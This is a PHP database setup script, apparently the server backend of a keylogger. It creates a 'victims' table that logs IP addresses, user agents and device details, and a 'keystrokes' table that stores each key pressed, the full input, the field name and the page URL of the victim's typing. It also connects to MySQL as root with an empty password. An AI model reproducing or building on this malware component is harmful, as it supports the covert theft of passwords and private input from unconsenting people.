<?php
// database.php - Database connection
$host = 'localhost';
$user = 'root';
$pass = '';
$db = 'keylogger_test';

// Create connection
$conn = new mysqli($host, $user, $pass);

// Create database if not exists
$conn->query("CREATE DATABASE IF NOT EXISTS $db");
$conn->select_db($db);

// Create victims table
$conn->query("CREATE TABLE IF NOT EXISTS victims (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(100) UNIQUE,
    ip_address VARCHAR(50),
    user_agent TEXT,
    device_info TEXT,
    first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_active DATETIME DEFAULT NULL
)");

// Create keystrokes table
$conn->query("CREATE TABLE IF NOT EXISTS keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    session_id VARCHAR(100),
    app_name VARCHAR(100),
    field_name VARCHAR(100),
    key_pressed VARCHAR(50),
    full_input TEXT,
    page_url TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
)");
?>